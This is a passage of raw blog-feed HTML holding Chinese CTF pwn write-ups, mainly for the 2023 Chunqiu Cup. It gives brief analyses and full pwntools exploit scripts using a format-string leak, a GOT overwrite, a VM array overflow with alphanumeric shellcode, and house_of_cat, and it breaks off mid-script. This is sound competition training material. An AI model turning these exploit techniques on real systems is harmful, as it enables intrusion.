5</span><br>add(<span class="hljs-number">0xf0</span>, p64(fake_chunk)) <span class="hljs-comment"># 6</span><br><br>payload = house_of_cat(fake_chunk)<br>edit(<span class="hljs-number">4</span>, payload)<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170239457.png" alt="image-20230709170239457"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-春秋杯pwn-wp</title>
    <link href="/2023/05/23/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/"/>
    <url>/2023/05/23/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-春秋杯pwn-wp"><a href="#2023-春秋杯pwn-wp" class="headerlink" title="2023-春秋杯pwn-wp"></a>2023-春秋杯pwn-wp</h1><p>一共六道题，比赛期间做出来4道，排名92。</p><p>babyaul那道题纯属不太会，three-boy那道题主要是最后一天排名落后了，就不太想做了。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230709173316006.png" alt="image-20230709173316006"></p><h2 id="p2048"><a href="#p2048" class="headerlink" title="p2048"></a>p2048</h2><p>题目是一个小游戏，有点怪怪的。玩通关即可获取shell。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214025865.png" alt="image-20230711214025865"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214056559.png" alt="image-20230711214056559"></p><h2 id="easy-LzhiFTP-CHELL"><a href="#easy-LzhiFTP-CHELL" class="headerlink" title="easy_LzhiFTP_CHELL"></a>easy_LzhiFTP_CHELL</h2><p>查看保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711211521146.png" alt="image-20230711211521146"></p><p>程序设置伪随机数作为登录密码。</p><p>程序存在格式化字符串漏洞，可以泄露程序基地址。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711212001764.png" alt="image-20230711212001764"></p><p>程序分配时，多分配一次造成溢出。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711212246800.png" alt="image-20230711212246800"></p><p>覆盖free的got表为system_plt。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./easy_LzhiFTP&#x27;</span><br>libc_name = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>elf = ELF(fn)<br>libc = ELF(libc_name)<br>fun = cdll.LoadLibrary(libc_name)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;47.94.224.3&#x27;</span>, <span class="hljs-number">14136</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">cont</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;IMLZH1-FTP&gt; &#x27;</span>, cont)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">filename, content=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span></span>):<br>    menu(<span class="hljs-string">b&#x27;touch &#x27;</span> + filename)<br>    p.sendafter(<span class="hljs-string">&#x27;Context:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-string">&#x27;edit&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    menu(<span class="hljs-string">&#x27;cat&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():<br>    menu(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    menu(<span class="hljs-string">&#x27;bye&#x27;</span>)<br><br><br>fun.srand(<span class="hljs-number">100</span>)<br>pwd = fun.rand() % <span class="hljs-number">115</span> * fun.rand() % <span class="hljs-number">200</span><br>pwd = <span class="hljs-number">0x72</span><br><br>p.sendafter(<span class="hljs-string">&#x27;Username: &#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>p.sendafter(<span class="hljs-string">&#x27;Password: &#x27;</span>, p32(pwd))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;(yes/No)&#x27;</span>, <span class="hljs-string">&#x27;No%19$p&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Your Choice:No&#x27;</span>)<br>codebase = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) &amp; ~<span class="hljs-number">0xfff</span>) - <span class="hljs-number">0x1000</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br>file_name = codebase + <span class="hljs-number">0x4A80</span><br>files = codebase + <span class="hljs-number">0x4b00</span><br><br>system_plt = codebase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = codebase + elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    touch(<span class="hljs-string">b&#x27;flag&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>touch(p64(files + <span class="hljs-number">0x10</span>), <span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, p64(free_got))<br><br>edit(<span class="hljs-number">2</span>, p64(system_plt))<br><br><span class="hljs-comment"># dbg()</span><br><br>delete(<span class="hljs-number">4</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711213046085.png" alt="image-20230711213046085"></p><h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>检查保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214247788.png" alt="image-20230711214247788"></p><p>分配一段可读可写可执行的地址。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214628801.png" alt="image-20230711214628801"></p><p>玩游戏刷钱。也就是1~4位md5值爆破。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214810610.png" alt="image-20230711214810610"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(<span class="hljs-built_in">str</span>.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">res</span>):<br>    s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzA&#x27;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                    src = a + b + c + d<br>                    <span class="hljs-keyword">if</span> md5(src) == res:<br>                        <span class="hljs-keyword">return</span> src<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))    <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params">level, times</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>, <span class="hljs-built_in">str</span>(level))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):<br>        p.recvuntil(<span class="hljs-string">&#x27;MD5(&#x27;</span>)<br>        src = p.recv(<span class="hljs-number">4</span>).decode()<br>        p.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>        res = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>        t = exploit(res)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, t)<br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到足够的钱后，调用<code>sub_401396</code>获取足够的执行次数，调用<code>sub_40124D</code>将数据写入mmap分配的空间，最后调用<code>sub_401072</code>执行vm指令。</p><p>其中，实现vm虚拟指令部分存在数组溢出。可以覆盖返回地址为mmap，从而执行可见字符shellcode。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711215735810.png" alt="image-20230711215735810"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;39.106.131.193&#x27;</span>, <span class="hljs-number">25256</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b execve</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(<span class="hljs-built_in">str</span>.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">res</span>):<br>    s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzA&#x27;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                    src = a + b + c + d<br>                    <span class="hljs-keyword">if</span> md5(src) == res:<br>                        <span class="hljs-keyword">return</span> src<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))    <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params">level, times</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>, <span class="hljs-built_in">str</span>(level))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):<br>        p.recvuntil(<span class="hljs-string">&#x27;MD5(&#x27;</span>)<br>        src = p.recv(<span class="hljs-number">4</span>).decode()<br>        p.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>        res = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>        t = exploit(res)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, t)<br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode</span>(<span class="hljs-params">a, b, c ,d</span>):<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-built_in">chr</span>(b) + <span class="hljs-built_in">chr</span>(c) + <span class="hljs-built_in">chr</span>(d)<br><br>load = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;A&#x27;</span>, b, c ,d)<br>load_z = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;B&#x27;</span>, b, c, d)<br>add = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;E&#x27;</span>, b, c, d)<br>mul = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;J&#x27;</span>, b, c, d)<br>myor = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;H&#x27;</span>, b, c ,d)<br>write = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;C&#x27;</span>, b, c, d)<br>sub = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;F&#x27;</span>, b, c, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">content</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;to purchase&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">expand</span>():<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;you need : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0xf0</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use</span>():<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">3</span>)<br><br><br>bss = <span class="hljs-number">0x20000</span> + <span class="hljs-number">0x18</span><br><br>game(<span class="hljs-number">4</span>, <span class="hljs-number">30</span>)<br>expand()<br><br>shellcode = <span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br><br>zero = <span class="hljs-number">0x30</span><br><br>payload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># payload += load(0x37 + 0x10, zero, 0x37 + 0x40)</span><br><span class="hljs-comment"># payload += mul(0x37 + 0x10, 0x37 + 0x10, zero)</span><br>payload += load(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x10</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x18</span>)<br>payload += load(zero, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x22</span>)<br>payload += load(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x20</span>)<br>payload += sub(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>)<br>payload += write(<span class="hljs-number">0x6f</span>, zero, zero)<br>payload = payload.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;x&#x27;</span>)<br><br>payload += shellcode<br><br>buy(payload)<br><br>use()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711215949846.png" alt="image-20230711215949846"></p><h2 id="sigin-shellcode"><a href="#sigin-shellcode" class="headerlink" title="sigin_shellcode"></a>sigin_shellcode</h2><p>查看保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220537281.png" alt="image-20230711220537281"></p><p>mips32架构下的pwn题。</p><p>伪随机数，下到100层获取足够的钱。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220650959.png" alt="image-20230711220650959"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220749396.png" alt="image-20230711220749396"></p><p>通过获得的钱购买战斗力。</p><p>最后战斗，战胜boss后，获取执行shellcode的机会。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220926671.png" alt="image-20230711220926671"></p><p>shellcode要求是mips32架构下的可见字符，题目已经给了大部分shellcode，我们只需要使execve第2个与第3个参数为0即可，即使$a1, $a2为0。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221056501.png" alt="image-20230711221056501"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    <span class="hljs-comment"># p = process([&#x27;chroot&#x27;, &#x27;.&#x27;, &#x27;./qemu-mipsel-static&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./pwn&#x27;])</span><br>    p = process([<span class="hljs-string">&#x27;chroot&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;./qemu-mipsel-static&#x27;</span>, <span class="hljs-string">&#x27;./pwn&#x27;</span>])<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;39.106.65.236&#x27;</span>, <span class="hljs-number">38832</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br>rand = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span 